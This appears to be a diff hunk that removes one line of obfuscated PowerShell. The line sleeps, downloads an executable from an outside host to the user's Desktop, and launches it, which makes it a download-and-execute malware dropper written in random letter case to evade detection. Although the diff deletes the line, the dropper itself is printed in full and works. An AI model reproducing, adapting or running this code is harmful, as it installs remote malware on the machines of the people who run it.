@@ -1,1 +1,0 @@
-$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDERpATh('Desktop');(&'New-Object' 'System.Net.WebCLient').dOwNloADfILE.inVOKE('http://tonetdog.com/updedge','$Des\6116559.exe');&'Start-Process' $Des\6116559.exe
